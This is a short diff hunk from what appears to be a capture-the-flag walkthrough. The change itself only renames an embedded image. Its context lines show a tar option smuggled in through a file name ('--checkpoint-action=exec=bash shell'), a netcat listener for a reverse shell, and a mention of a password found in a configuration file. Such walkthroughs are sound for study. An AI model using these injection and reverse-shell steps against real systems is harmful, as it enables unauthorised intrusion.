@@ -152,7 +152,7 @@ touch /var/www/html/--checkpoint-action=exec=bash\ shell
 nc -nvlp 1338
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 There is a password in the configuration file, it does not work for root but we see in the home directory another user called jjameson
 
